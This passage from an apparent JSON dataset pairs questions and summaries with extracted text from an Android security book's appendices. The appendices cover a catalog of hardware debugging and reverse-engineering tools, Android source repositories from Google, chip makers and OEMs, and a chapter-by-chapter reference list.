01:51:38:PM 02/27/2014 Page 496\nAppendix A ■ Tool Catalog 497\nSegger J-Link\nSegger’s J-Link device is a middle-tier JTAG debug probe. You can use it to\ninterface with a variety of different JTAG-enabled devices. More information\nis available at http://www.segger.com/debug-probes.html.\nJTAGulator\nJoe Grand’s JTAGulator device saves time when identifying the purpose of\nunknown test points on a device. It only requires you to connect wires to the\ntest points once and then automatically determines each pin’s purpose. You can\nfi nd more information about JTAGulator at http://www.grandideastudio.com/\nportfolio/jtagulator/.\nOpenOCD\nThe Open On-Chip Debugger (OpenOCD) software is an open source solu-\ntion for interfacing with various JTAG-enabled devices. It allows you to use\nless expensive JTAG adapters and quickly modify the code as needed for your\nproject. Read more about OpenOCd at http://openocd.sourceforge.net/.\nSaleae\nSalae’s logic analyzers enable you to monitor electrical signals in real time. With\nfeatures like real-time decoding and support for many protocols, a Salae makes\nmonitoring data traversing circuits more fun and easy. Further information is\navailable at http://www.saleae.com/.\nBus Pirate\nThe Bus Pirate, developed by Dangerous Prototypes, is an open source hardware\ndevice that enables you to speak to electronic devices. It supports debugging,\nprogramming, and interrogating chips through the use of standard protocols\nand a command line interface. More information about the Bus Pirate is avail-\nable at http://dangerousprototypes.com/bus-pirate-manual/.\nGoodFET\nTravis Goodspeed’s GoodFET is an open source fl ash emulator tool (FET) and\nJTAG adapter. It is similar to the Bus Pirate in many ways, but is based on\ndifferent hardware. To learn more about the GoodFET, visit http://goodfet\n.sourceforge.net/.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 497\n498 Appendix A ■ Tool Catalog\nTotal Phase Beagle USB\nTotal Phase’s line of USB Analyzer products let you monitor data moving across\nUSB connections at a variety of speeds. They come with custom software that\nmakes decoding communications easy, even if custom data formats are used. More\ninformation is available at http://www.totalphase.com/protocols/usb/.\nFacedancer21\nTravis Goodspeed’s Facedancer21 is an open source hardware device that allows\nyou to take the role of a USB device or host. Once connected, you write your\nemulation code in Python and respond to the peer however you like. This enables\nUSB fuzzing as well as emulating just about any USB device imaginable. You\ncan read more about the Facedancer at http://goodfet.sourceforge.net/\nhardware/facedancer21/ or purchase assembled units at http://int3.cc/\nproducts/facedancer21.\nTotal Phase Beagle I2C\nTotal Phase’s line of I2C Host Adapter products enable communicating with\nelectronics that talk over I2C interfaces. It plugs into your machine using USB\nand includes custom software to make talking to I2C easy. Further information\nabout this device is available at http://www.totalphase.com/protocols/i2c/.\nChip Quik\nUsing Chip Quik, you can easily remove surface mount components from a\ncircuit board. Since it has a higher melting point than regular solder, which\nsolidifi es almost instantly, it keeps the solder liquefi ed longer allowing you\nto separate components. You can read more about Chip Quik at http://www\n.chipquikinc.com/ and purchase it from just about any electronics supply shop.\nHot air gun\nA hot air gun …\nXeltek SuperPro\nXeltek’s line of products under the SuperPro moniker enables access to read-\ning and writing many different types of fl ash memory. Xeltek makes adapters\nto support many different form factors and provides software to make the\nprocess easy. More information about Xeltek’s products is available at http:\n//www.xeltek.com/.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 498\nAppendix A ■ Tool Catalog 499\nIDA\nHex-Rays’ Interactive Disassembler (IDA) products let you peer into the inner\nworkings of closed-source software. It is available in a free, limited evalua-\ntion version and a Pro version. The Pro version supports many instruction set\narchitectures (ISAs) and binary formats. You can learn more about IDA, and\ndownload the free version, from https://www.hex-rays.com/products/ida/\nindex.shtml.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 499\nbapp01.indd 01:51:38:PM 02/27/2014 Page 500"
  },
  {
    "input": "What are the main open source repositories and resources available for accessing and contributing to the Android operating system's source code?",
    "summary": "The Android operating system is primarily open source, with many components available under permissive licenses like BSD or Apache, and some requiring modifications to be open source under the GPL. This appendix provides resources for accessing the source code used to build Android devices, including Google's AOSP, which is the main source for Android development. It also details open source repositories from various SoC manufacturers and OEMs, highlighting their contributions and availability of source code.",
    "output": "APPENDIX\nB\nOpen Source Repositories\nThe Android operating system is mostly open source. Although some compo-\nnents are closed source, many parts of the system are either released open source\nunder a permissive license (BSD or Apache) or under a license that requires that\nmodifi cations be released open source (GNU Public License [GPL]). Because\nof the GPL, many vendors in the ecosystem make source code modifi cations\navailable to the general public. This appendix documents the publicly accessible\nresources that distribute the source code used to build various Android devices.\nGoogle\nAs mentioned in Chapter 1 of this book, Google is the originator of the Android\noperating system. Google develops new versions in secret and then contributes\nthe code to the Android Open Source Project (AOSP) upon release. Several of the\nfacilities Google provides for accessing source code are documented elsewhere\nin this text, but for your convenience, we have repeated them here.\nAOSP\nThe AOSP is a collection of Git repositories that contain the open source parts of\nthe Android operating system. It is the primary outlet for all things Android. It\neven serves as the upstream starting point for original equipment manufacturers\n501\nbapp02.indd 01:51:51:PM 02/27/2014 Page 501\n502 Appendix B ■ Open Source Repositories\n(OEMs) to build fi rmware images. In addition to the source code for the differ-\nent runtime components, AOSP includes a full build environment, source for\nthe Native Development Kit (NDK) and Software Development Kit (SDK), and\nmore. It supports building full device images for Nexus devices in spite of some\ncomponents being provided in binary-only form.\nFor any given device, there are two primary components: the platform and\nthe kernel. For Nexus devices, both components are contained completely in\nAOSP. The AOSP repository, which was once hosted alongside the Linux kernel\nsource, is now hosted on Google’s own servers at the following URL: https://\nandroid.googlesource.com/.\nAOSP uses a special tool called repo to organize and manage the collection\nof Git repositories. You can fi nd more information on using this tool and obtain\na full source checkout from Google’s offi cial documentation at http://source\n.android.com/source/downloading.html.\nIn addition to being able to check out the AOSP repository in whole or in part,\nGoogle provides a source browsing facility via its Google Code site: https://\ncode.google.com/p/android-source-browsing/.\nAs mentioned in Chapter 10, kernel source repositories are split up based on\nSystem-on-Chip (SoC) support. There are repositories for Open Multimedia\nApplications Platform (OMAP) from Texas Instruments, Mobile Station Modem\n(MSM) from Qualcomm, Exynos from Samsung, Tegra from Nvidia, and the\nemulator (goldfi sh). Although the upstream source trees for these are maintained\nby the SoC manufacturers themselves, Google hosts the repository offi cially\nused for Nexus devices.\nGerrit Code Review\nBeyond providing source code repositories and a source browser, Google also\nhosts a Gerrit code review system. It is through this system that contributors\nfrom outside Google are encouraged to submit patches. Keeping an eye on this\nrepository enables researchers to see potential changes that are being made to the\nAOSP code prior to the changes actually being committed. You can fi nd the Gerrit\nsource-code review system at: https://android-review.googlesource.com/.\nSoC Manufacturers\nWithin the Android ecosystem, the SoC manufacturers are responsible for\ncreating Board Support Packages (BSPs). These BSPs are nothing more than\nmodifi ed versions of upstream projects ported to work on the SoC manufactur-\ners’ hardware.\nbapp02.indd 01:51:51:PM 02/27/2014 Page 502\nAppendix B ■ Open Source Repositories 503\nEach manufacturer maintains its own source repositories. Whether this\ndevelopment is done completely in the open is largely up to the manufacturer\nitself. Many do provide an open source repository, but some do not. The pri-\nmary open source component for BSPs is the Linux kernel. Under the terms of\nthe GPL, these companies are legally bound to provide access to kernel source\nmodifi cations in some form.\nThe rest of this section sheds light on the practices of the top SoC manufacturers.\nAllWinner\nThe AllWinner SoC is an ARM core that is developed by AllWinner Technology\nin the Guangdong Province in China. The code name for these SoCs is sunxi.\nConveniently, AllWinner makes the source code for its BSP, including its kernel\nand several other components, available via GitHub: https://github.com/\nlinux-sunxi.\nIt’s worth noting that there is no offi cial Google mirror of these sources because,\nto date, no offi cial AOSP-supported devices have been built on AllWinner’s SoCs.\nIntel\nUnlike the rest of the SoC manufacturers in this section, Intel does not produce\nARM chips. Instead, Intel is attempting to break into the mobile space using\npower effi cient x86-based SoCs based on its Atom line. Specifi cally, the Bay\nTrail and Silvermont SoCs are aimed at the mobile space, but very few actual\nAndroid devices are built on them. That said, Intel is the biggest proponent of\nrunning Android on X86 hardware and provides quite a few resources under\nthe “android-ia” moniker. Intel makes its resources available via its developer\nsite, Gerrit code review, and download site:\n■ https://01.org/android-ia/documentation/developers\n■ https://android-review.01.org/#/admin/projects/\n■ https://01.org/android-ia/downloads\nNOTE Links from Intel’s Gerrit site provide GitWeb access for the repositories\nhosted there.\nMarvell\nMarvell is traditionally known as a manufacturer of several plug form fac-\ntor ARM computers. Few mobile devices are based on Marvell ARM SoCs.\nOne device that is rumored to be based on Android and a Marvell SoC is the\nbapp02.indd 01:51:51:PM 02/27/2014 Page 503\n504 Appendix B ■ Open Source Repositories\nOne Laptop Per Child (OLPC) XO Tablet. Apart from the mobile space, many\nsecond-generation Google TV devices, which are cousins of Android devices,\nare built on Marvell SoCs. Although Marvell appears to have an open source\nsite, it was empty at the time of this writing.\nSome Marvell SoC-specifi c code is included in the upstream Linux kernel,\nthough. You can fi nd it at: http://opensource.marvell.com/.\nMediaTek\nMediaTek is another Chinese SoC manufacturer. In addition to producing SoCs,\nit also produces many other peripheral chips used by other OEMs. The source\ncode for drivers for many of its components is available on its download site\nat: http://www.mediatek.com/_en/07_downloads/01_windows.php?sn=501.\nLike AllWinner, no AOSP-supported devices to date have been built on a\nMediaTek SoC.\nNvidia\nNvidia produces the Tegra line of ARM SoCs used by several Android devices,\nincluding the Nexus 7 2012. As an upstanding member of the ecosystem, Nvidia\noperates a developer program, both for its Tegra SoCs and for its budding Shield\nvideo game system. Additionally, it provides a convenient GitWeb interface to\nits open source Git repositories. It’s also possible to check out the source directly\nfrom the GitWeb site or from the AOSP mirror:\n■ http://nv-tegra.nvidia.com/gitweb/\n■ https://android.googlesource.com/kernel/tegra\n■ https://developer.nvidia.com/develop4shield#OSR\nTexas Instruments\nThough Texas Instruments (TI) has stated its intention to exit the mobile space,\nits OMAP SoCs have been used in a large number of Android devices over the\nyears. This includes the Samsung Galaxy Nexus, Pandaboard, and Google Glass.\nAs one would expect, Google hosts a mirror of the OMAP kernel inside AOSP.\nYou can fi nd various versions of the OMAP kernel source at:\n■ http://dev.omapzoom.org/\n■ http://git.kernel.org/cgit/linux/kernel/git/tmlind/linux-\nomap.git/\n■ https://android.googlesource.com/kernel/omap\nbapp02.indd 01:51:51:PM 02/27/2014 Page 504\nAppendix B ■ Open Source Repositories 505\nDue to its long life in the ecosystem, there are numerous resources that address\nthe OMAP platform, including community-run Wikis. Following are links to a\nfew of the relevant resources:\n■ http://elinux.org/Android_on_OMAP\n■ http://www.omappedia.com/wiki/Main_Page\n■ http://www.ti.com/lsds/ti/tools-software/android.page\n■ https://gforge.ti.com/gf/project/omapandroid\nQualcomm\nQualcomm is perhaps the most prolifi c SoC manufacturer in the Android eco-\nsystem, producing both MSM and Application Processor Qualcomm (APQ)\nfamilies of SoCs. APQ differs from MSM in that it is only an application proces-\nsor; it does not include a baseband.\nIn the Android open source community, Qualcomm provides extensive\nresources to the CodeAurora forum. CodeAurora is a consortium of companies\nthat are working openly to bring optimizations and innovation to end users. A\nnumber of open source repositories, including some that are not Android-specifi c,\nare available via the CodeAurora forum site. Additionally, Google maintains\na mirror of the MSM kernel tree used in its Nexus devices. Use the following\nthree URLs to fi nd source code for Qualcomm:\n■ https://www.codeaurora.org/projects/all\n■ https://www.codeaurora.org/cgit/\n■ https://android.googlesource.com/kernel/msm\nSamsung\nSamsung produces its own family of SoCs dubbed Exynos. It uses these in the\nmanufacturing of several of its Android-based mobile devices, including certain\nversions of the Galaxy S3 and Galaxy S4. Samsung makes its kernel source code\nand some of its modifi cations to the Android tree available via a searchable\nOpen Source portal. Because the Nexus S and Nexus 10 are based on Exynos\nSoCs, Google hosts a mirror of the kernel trees. The following URLs provide\naccess to Samsung’s open source code:\n■ http://opensource.samsung.com/\n■ https://android.googlesource.com/kernel/samsung\n■ https://android.googlesource.com/kernel/exynos\nbapp02.indd 01:51:51:PM 02/27/2014 Page 505\n506 Appendix B ■ Open Source Repositories\nIn addition, several development boards are based on Exynos. Hardkernel’s\nODROID products, InSignal’s OrigenBoard, and ArndaleBoard are among these.\nSource code for these devices is available from the respective manufacturers\nat the following sites:\n■ http://com.odroid.com/sigong/nf_file_board/nfile_board.php\n■ http://www.arndaleboard.org/wiki/index.php/\nResources#How_to_Download_Source_Tree\n■ http://www.origenboard.org/wiki/index.php/\nResources#How_to_Download_Source_Tree\n■ http://www.origenboard.org/wiki/index.php/\nResources#How_to_Download_Source_Tree_2\nOEMs\nRecall that OEMs are ultimately responsible for creating end-user devices that\nare functional. It is no surprise that OEMs make the most modifi cations to the\nvarious components. This includes open source components as well as those\nlicensed under proprietary licenses or developed in house. However, only the\nformer changes are typically released in source code form. Like the SoC manu-\nfacturers, OEMs are legally required to release some code under the terms of\nthe GPL.\nAlthough all OEMs are bound by mostly the same rules, actual practices vary\nfrom one to the next. That is, some OEMs use an open development process\nusing sites like GitHub, whereas others develop in secret and provide only\ndownloadable code in archive form. The time it takes each OEM to make its\ncode available can also vary from one OEM to the next or one release to the next.\nThe rest of this section sheds light on the practices of several top device OEMs\nand provides links to the source code download portal for them.\nASUS\nAs a manufacturer of several Android devices, including the popular Nexus\n7 tablets, ASUS makes source code available to the general public. Shortly after\nreleasing a new fi rmware update, ASUS makes the source code available on its\nsupport website in the form of compressed TAR archives. Because the Nexus\n7 tablets run vanilla Android, no source code is hosted for those devices.\nTo fi nd the source code for a particular device, visit the ASUS support site\n(www.asus.com/support) and search for the device by name or model number,\nclick the Drivers & Tools, and select Android from the drop-down list.\nbapp02.indd 01:51:51:PM 02/27/2014 Page 506\nAppendix B ■ Open Source Repositories 507\nHTC\nHTC is one of the oldest Android equipment manufacturers. It created the\nvery fi rst publicly available developer device—the HTC G1. At the time of\nits release, it was frequently called the “G Phone.” Later, HTC produced the\nNexus One, which was the fi rst Nexus device ever made. Although these\ntwo devices were supported by AOSP, HTC has also made a large number of\nretail devices over the years. Most recently, it released another favorite among\nconsumers: the HTC One.\nHTC typically posts source code within a few days of making a fi rmware\nrelease. The available source is limited to the Linux kernel. None of HTC’s\nextensive platform modifi cations are released as open source. HTC releases\nsource code as compressed TAR archives via its Developer Center website at\nhttp://www.htcdev.com/devcenter/downloads.\nLG\nLG has quickly become one of the top OEMs with devices such as the Optimus\nG and LG G2. LG also created the two most recent Nexus smart phones, the\nNexus 4 and 5. As with other OEMs, LG does not release source code for its\nNexus devices because they are entirely AOSP supported. However, LG does\nrelease source code for its retail devices. Unfortunately, it sometimes takes quite\na while for LG to post the source code after releasing a new fi rmware revision.\nYou can easily locate the compressed TAR archive containing source code for\na particular device by searching LG’s open source portal for the device’s name\nor model number: http://www.lg.com/global/support/opensource/index.\nMotorola\nMotorola has been a player in the Android ecosystem for quite some time.\nIt comes as no surprise with Motorola’s background in silicon as well as the\nmobile space. Motorola created the ultra-popular RAZR fl ip phone. In 2013,\nGoogle acquired Motorola Mobility, the department of Motorola that produces\nAndroid devices. Though it has yet to make a Nexus device, it has made quite a\nfew retail devices. For example, Motorola produces the DROID line of devices\nfor Verizon.\nMotorola releases the source code used to build its devices via a Source Forge\nproject page. The releases happen in a fairly timely fashion, usually within a\nmonth or so of the release of a device or fi rmware. The fi les are made available\nas compressed TAR archives at http://sourceforge.net/motorola/wiki/\nProjects/.\nbapp02.indd 01:51:51:PM 02/27/2014 Page 507\n508 Appendix B ■ Open Source Repositories\nSamsung\nSamsung is the market leader in Android devices and has produced some of the\nmost popular devices to date. Samsung’s offerings include the Galaxy line of\ndevices as well as three Nexus devices: the Nexus S, Galaxy Nexus, and Nexus\n10. Samsung is fairly timely in its source code releases. It makes the source code\navailable as compressed TAR archives via its open source portal. This includes\nboth kernel and platform archives, which you can fi nd at http://opensource\n.samsung.com/.\nSony Mobile\nSony’s mobile division was born from a partnership and subsequent acquisition\nof Ericsson, a Swedish mobile company. Over the years of involvement in the\nmobile ecosystem, Ericsson produced many devices. Some of the most recent\ndevices include the Xperia line. Sony Mobile has yet to produce a Nexus device.\nSony-Ericsson is perhaps the quickest and most open when it comes to its\nsource code. In some cases, it releases the source code for devices prior to release.\nFurther, Sony-Ericsson is the only Android device OEM that embraces open\nsource so much as to create an offi cial GitHub account to host code. In addition\nto its GitHub account, Sony-Ericsson also makes traditional compressed TAR\narchives available via its developer portal. You can access these sites using the\nfollowing URLs:\n■ http://developer.sonymobile.com/downloads/\nxperia-open-source-archives/\n■ http://developer.sonymobile.com/downloads/opensource/\n■ https://github.com/sonyxperiadev/\nUpstream Sources\nAs mentioned numerous times through this book, Android is an amalgamation\nof many open source projects. AOSP contains a local copy of nearly all of these\nprojects in the external directory. As of this writing, the subdirectory count is\n169. Although it isn’t necessarily a one-to-one mapping, many of these directo-\nries represent an open source project that is managed entirely separately from\nAndroid. Each project likely varies in the way the developers do their develop-\nment. In any case, a few quick Internet searches should turn up a project home\npage for each project. Using those resources, you can usually fi nd access to the\nlatest versions of the upstream project’s source code. For example, WebKit is one\nof the larger open source projects in the external directory. Its project home\npage is http://www.webkit.org/ and the process for obtaining its source code\nis documented in detail at http://www.webkit.org/building/checkout.html.\nbapp02.indd 01:51:51:PM 02/27/2014 Page 508\nAppendix B ■ Open Source Repositories 509\nThe largest open source component of the Android operating system is\nundoubtedly the Linux kernel. Literally thousands of developers have con-\ntributed to the project. The source code itself, uncompressed, stands at almost\n600 megabytes (MB). As mentioned earlier in this appendix, Google and other\ncompanies host working mirrors of the Linux kernel source code. These mir-\nrors are often specifi c to a device or SoC family. In addition, the Linux kernel\nproject continues to chug along on its own. The upstream Linux kernel project\nhas many resources surrounding it, but the source code itself has been hosted\non www.kernel.org for quite some time. Be warned, though; using the upstream\nLinux kernel source repositories is not for the faint of heart, because there are\nmany projects, repositories, and divisions of responsibility. The following URLs\nlink to the Linux kernel’s offi cial source code repositories and include: the main\nrepository listing, the stable tree, and Linus’ merge tree.\n■ https://git.kernel.org/cgit/\n■ https://git.kernel.org/cgit/linux/kernel/git/stable/linux-\nstable.git/\n■ https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/\nOthers\nIn addition to the source code resources already documented in this appendix,\nthe Android hobbyist community also makes a decent amount of source code\navailable. From Custom fi rmware to motivated individuals, Android-related\nsource code is available all over the Internet. This section documents several\nsources we found while researching Android security.\nCustom Firmware\nCustom fi rmware teams operate much in the same way that an OEM’s software\nteam would operate. They customize the AOSP code and manage integrating\nsoftware that supports the various hardware components found in devices.\nProjects such as CyanogenMod, AOKP, SuperNexus, OmniROM, and more\nmake their source code available openly. Most even develop entirely in the\nopen. You can fi nd the source code for the four projects mentioned here at\nthe following URLs:\n■ https://github.com/CyanogenMod\n■ https://github.com/AOKP\n■ https://github.com/SuperNexus\n■ http://omnirom.org/source-code/\nbapp02.indd 01:51:51:PM 02/27/2014 Page 509\n510 Appendix B ■ Open Source Repositories\nLinaro\nThe Linaro project is another great resource that makes a lot of source code\navailable. It operates similar to a Linux distribution in that it tries to port and\nintegrate components in an open effort to product high quality builds. The\nLinaro project source code is at https://wiki.linaro.org/Source.\nReplicant\nAnother interesting project is the Replicant project. The aim of Replicant is to\nproduce a fully open source and liberally licensed device fi rmware that is com-\npatible with Android. It doesn’t seek to carry the Android name, but is based on\nAOSP. Find out more at http://redmine.replicant.us/projects/replicant/\nwiki/ReplicantSources.\nCode Indexes\nAs a matter of convenience, a few independent parties have set up a browsable\nand searchable index of the AOSP source code. Here’s one we recommend:\n■ http://androidxref.com/\nIndividuals\nBeyond these projects, quite a few individuals in the community put up a\nrepository and develop interesting features. For example, efforts by individuals\ninclude back-porting new Android releases to unsupported devices. Locating\nthese types of source repositories can be tricky, though. Searching popular open\nsource development sites like GitHub and BitBucket is one way to locate these\nrepositories. Another way is to watch the popular Android-related news sites\nlike Android Police or forums like XDA Developers.\nbapp02.indd 01:51:51:PM 02/27/2014 Page 510"
  },
  {
    "input": "",
    "summary": "This appendix compiles references to honor prior research and provide resources on Android security, covering topics like kernel features, debugging tools, and vulnerability analysis. It organizes links by chapter, including academic papers, developer documentation, and security reports, to support deeper exploration of Android's security mechanisms and challenges. The references highlight key areas such as permission systems, fragmentation, and exploitation techniques, emphasizing the collaborative nature of Android security research.",
    "output": "APPENDIX\nC\nReferences\nAndroid security builds on the works of many, many researchers who publish\npapers or slides and who speak at conferences. The references in this section\npay homage to prior work and provide you with additional resources to learn\nmore about the topics covered in this book.\nChapter 1\n“Android, the world’s most popular mobile platform,” http://developer\n.android.com/about/index.html\n“Android (operating system),” Wikipedia, http://en.wikipedia.org/wiki/\nAndroid_(operating_system)\n“Alliance Members: Open Handset Alliance,” http://www.openhandsetalliance\n.com/oha_members.html\n“Android version history,” Wikipedia, http://en.wikipedia.org/wiki/\nAndroid_version_history\n“Dashboards,” Android Developers, http://developer.android.com/about/\ndashboards/\n“Codenames, Tags, and Build Numbers,” Android Developers, http://source\n.android.com/source/build-numbers.html\n511\nbapp03.indd 01:52:4:PM 02/27/2014 Page 511\n512 Appendix C ■ References\n“Android on Intel Architecture,” Intel Corporation, https://01.org/android-ia/\n“Android Phones & Tablets,” Intel Developer Zone, http://software.intel\n.com/en-us/android/\n“MIPS Android,” Imagination Technologies Limited, http://www.imgtec.com/\nmips/developers/mips-android.asp\n“Processor Licensees,” ARM Ltd., http://www.arm.com/products/processors/\nlicensees.php\n“Gerrit Code Review,” Android Open Source Project, https://android-review\n.googlesource.com/\n“Android Fragmentation Visualized,” OpenSignal, July 2013, http://opensignal\n.com/reports/fragmentation-2013/\n“Android Fragmentation Visualized,” OpenSignal, August 2012, http://\nopensignal.com/reports/fragmentation.php\n“Android Compatibility,” Android Developers, http://source.android.com/\ncompatibility/\n“Android Security Announcements,” Google Groups, https://groups.google\n.com/forum/#!forum/android-security-announce\n“Android Open Source Project Issue Tracker,” https://code.google.com/p/\nandroid/issues/list\n“HTC Product Security,” HTC Corporation, July 2011, http://www.htc.com/\nwww/terms/product-security/\n“Security Advisories,” Code Aurora Forum, https://www.codeaurora.org/\nprojects/security-advisories\nChapter 2\n“Android Kernel Features,” Embedded Linux Wiki, http://elinux.org/\nAndroid_Kernel_Features\n“Android Property System,” just do IT, http://rxwen.blogspot.com/2010/01/\nandroid-property-system.html\n“Android Binder: Android Interprocess Communication,” Thorsten Schreiber,\nhttp://www.nds.rub.de/media/attachments/files/2012/03/binder.pdf\n“Android Zygote Startup,”, Embedded Linux Wiki, http://elinux.org/\nAndroid_Zygote_Startup\nbapp03.indd 01:52:4:PM 02/27/2014 Page 512\nAppendix C ■ References 513\n“Anonymous Shared Memory (ashmem) Subsystem,” LWN, http://lwn.net/\nArticles/452035/\n“Dalvik VM Instruction Formats,” Android Developers, http://source.android\n.com/devices/tech/dalvik/instruction-formats.html\n“Dalvik Executable Format,” Android Developers, http://source.android\n.com/devices/tech/dalvik/dex-format.html\n“Android App Components,” Android Developers, http://developer.android\n.com/guide/components/\nChapter 3\n“Android Booting,” Embedded Linux Wiki, http://elinux.org/Android_Booting\n“Android Fastboot,” Embedded Linux Wiki, http://elinux.org/Android_Fastboot\n“It’s Bugs All the Way Down: Security Research by Dan Rosenberg,” Dan\nRosenberg, http://vulnfactory.org/blog/\n“Rooting Explained + Top 5 Benefits Of Rooting Your Android Phone,”\nAndroid Police, http://www.androidpolice.com/2010/04/15/\nrooting-explained-top-5-benefits-of-rooting-your-android-phone/\n“So You Want To Know About Bootloaders, Encryption, Signing, And Locking? Let\nMe Explain,” Android Police, http://www.androidpolice.com/2011/05/27/\nso-you-want-to-know-about-bootloaders-encryption-signing\n-and-locking-let-me-explain/\n“HTC Unlock Internals,” Sogeti, http://esec-lab.sogeti.com/post/\nHTC-unlock-internals\n“Linux NULL Pointer Dereference Due to Incorrect proto_ops Initializa-\ntions (CVE-2009-2692),” Julien Tinnes, http://blog.cr0.org/2009/08/\nlinux-null-pointer-dereference-due-to.html\n“CVE-2009-2692: Linux Kernel proto_ops NULL Pointer Dereference,”\nxorl %eax, %eax, http://xorl.wordpress.com/2009/08/18/cve\n-2009-2692-linux-kernel-proto_ops-null-pointer-dereference/\n“The Android Boot Process from Power On,” Xdin Android blog, http://www\n.androidenea.com/2009/06/android-boot-process-from-power-on.html\n“Reversing Latest Exploid Release,” Anthony McKay Lineberry, http://dtors\n.org/2010/08/25/reversing-latest-exploid-release/\nbapp03.indd 01:52:4:PM 02/27/2014 Page 513\n514 Appendix C ■ References\n“udev Exploit (exploid),” thesnkchrmr, http://thesnkchrmr.wordpress\n.com/2011/03/27/udev-exploit-exploid/\n“Android vold mPartMinors[] Signedness Issue,” xorl %eax, %eax, http://xorl\n.wordpress.com/2011/04/28/android-vold-mpartminors\n-signedness-issue/\nChapter 4\n“PScout: Analyzing the Android Permission Specification,” Kathy Au, Billy\nZhou, James Huang, and David Lie, http://pscout.csl.toronto.edu/\n“Mapping & Evolution of Android Permissions,” Zach Lanier and Andrew\nReiter, http://www.veracode.com/images/pdf/webinars/android\n-perm-mapping.pdf\n“Faulty Encryption Could Leave Some Android Apps Vulnerable,”\nBrian Wall, Symantec, http://www.symantec.com/connect/blogs/\nfaulty-encryption-could-leave-some-android-apps-vulnerable\n“Multiple Samsung (Android) Application Vulnerabilities,” Tyrone\nErasmus and Mike Auty, MWR InfoSecurity, http://labs\n.mwrinfosecurity.com/advisories/2012/09/07/multiple-samsung\n-android-application-vulnerabilities/\n“Android OEM’s Applications (In)security and Backdoors Without Permis-\nsion,” André Moulu, QUARKSLAB, http://www.quarkslab.com/dl\n/Android-OEM-applications-insecurity-and-backdoors-without\n-permission.pdf\n“SmsMessage Class,” Android Developers, http://developer.android.com/\nreference/android/telephony/SmsMessage.html\n“Analyzing Inter-Application Communication in Android,” Erika Chin , Adrienne\nPorter Felt, Kate Greenwood, and David Wagner, http://www.eecs\n.berkeley.edu/~daw/papers/intents-mobisys11.pdf\nChapter 5\n“Vulnerabilities vs. Attack Vectors,” Carsten Eiram, Secunia, http://secunia\n.com/blog/vulnerabilities-vs-attack-vectors-97\n“Common Vulnerability Scoring System,” FIRST, http://www.first.org/cvss\nbapp03.indd 01:52:4:PM 02/27/2014 Page 514\nAppendix C ■ References 515\n“Common Attack Pattern Enumeration and Classification,” MITRE Corporation,\nhttp://capec.mitre.org/\n“Smart-Phone Attacks and Defenses,” Chuanxiong Guo, Helen J. Wang, and\nWenwu Zhu, Microsoft, http://research.microsoft.com/en-us/um/\npeople/helenw/papers/smartphone.pdf\n“Probing Mobile Operator Networks, “ Collin Mulliner, CanSecWest 2012,\nhttp://cansecwest.com/csw12/mulliner_pmon_csw12.pdf\n“Dirty Use of USSD Codes in Cellular Network,” Ravi Borgaonkar, EkoParty\n2012, http://www.ekoparty.org/2012/ravi-borgaonkar.php\n“Remote Wipe Vulnerability Found on Android Phones,” iTnews, http://www\n.itnews.com.au/News/316905,ussd-attack-able-to-remotely\n-wipe-android-phones.aspx\n“Ad Network Research,” Dave Hartley, MWR InfoSecurity, https://www\n.mwrinfosecurity.com/articles/ad-network-research/\n“State of Security in the App Economy: ‘Mobile Apps Under Attack,’”\nArxan Technologies, http://www.arxan.com/assets/1/7/state-of\n-security-app-economy.pdf\n“Android Botnet Infects 1M+ Phones in China,” Threatpost, http://\nthreatpost.com/new-android-botnet-androidtrojmdk\n-infects-1m-phones-china-011513/77406\n“Dissecting the Android Bouncer,” Jon Oberheide and Charlie Miller, SummerCon\n2012, https://jon.oberheide.org/files/summercon12-bouncer.pdf\n“Adventures in BouncerLand,” Nicholas J. Percoco and Sean Schulte, Black Hat\nUSA 2012, http://media.blackhat.com/bh-us-12/Briefings/Percoco/\nBH_US_12_Percoco_Adventures_in_Bouncerland_WP.pdf\n“Some Information on APIs Removed in the Android 0.9 SDK Beta,” Android\nDevelopers Blog, http://android-developers.blogspot.com/2008/08/\nsome-information-on-apis-removed-in.html\n“When Angry Birds Attack: Android Edition,” Jon Oberheide, http://jon\n.oberheide.org/blog/2011/05/28/when-angry-birds-attack\n-android-edition/\n“How I Almost Won Pwn2Own via XSS,” Jon Oberheide, https://jon.oberheide\n.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/\n“The Second Operating System Hiding in Every Mobile Phone,” Thom\nHolwerda, OSNews, http://www.osnews.com/story/27416/The\n_second_operating_system_hiding_in_every_mobile_phone\nbapp03.indd 01:52:4:PM 02/27/2014 Page 515\n516 Appendix C ■ References\n“Bluetooth,” Android Developers, https://source.android.com/devices/\nbluetooth.html\n“android.bluetooth,” Android Developers, http://developer.android.com/\nreference/android/bluetooth/package-summary.html\n“Exploring the NFC Attack Surface,” Charlie Miller, Black Hat USA 2012,\nhttp://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12\n_Miller_NFC_attack_surface_WP.pdf\n“android.nfc,” Android Developers, http://developer.android.com/\nreference/android/nfc/package-summary.html\n“Near Field Communication.” Android Developers, http://developer.android\n.com/guide/topics/connectivity/nfc/index.html\n“USB.org Welcome,” USB Implementers Forum, Inc., http://www.usb.org/home\n“Beware of Juice-Jacking,” Brian Krebs, http://krebsonsecurity.com/2011/08/\nbeware-of-juice-jacking/\n“Juice Jacking 101,” Robert Rowley, http://www.slideshare.net/RobertRowley/\njuice-jacking-101-23642005\n“Extreme Android and Google Auth Hacking with Kos”, Hak5, Episode 1205,\nSeptember 19, 2012, http://hak5.org/episodes/hak5-1205\n“Phone to Phone Android Debug Bridge,” Kyle Osborn, https://github.com/\nkosborn/p2p-adb\n“Raider,” Michael Müller, https://code.google.com/p/raider-android\n-backup-tool/\n“Abusing the Android Debug Bridge,” Robert Rowley, Trustwave SpiderLabs,\nhttp://blog.spiderlabs.com/2012/12/abusing-the-android\n-debug-bridge-.html\n“The Impact of Vendor Customizations on Android Security,” Lei Wu, Michael\nGrace, Yajin Zhou, Chiachih Wu, and Xuxian Jiang, ACM CCS 2013,\nhttp://www.cs.ncsu.edu/faculty/jiang/pubs/CCS13.pdf\nChapter 6\n“Fuzz Testing of Application Reliability,” UW–Madison Computer Sciences\nDepartment. Retrieved April 3, 2013, from http://pages.cs.wisc\n.edu/~bart/fuzz/\n“Fuzzing for Security,” Abhishek Arya and Cris Neckar, Google, http://blog\n.chromium.org/2012/04/fuzzing-for-security.html\nbapp03.indd 01:52:4:PM 02/27/2014 Page 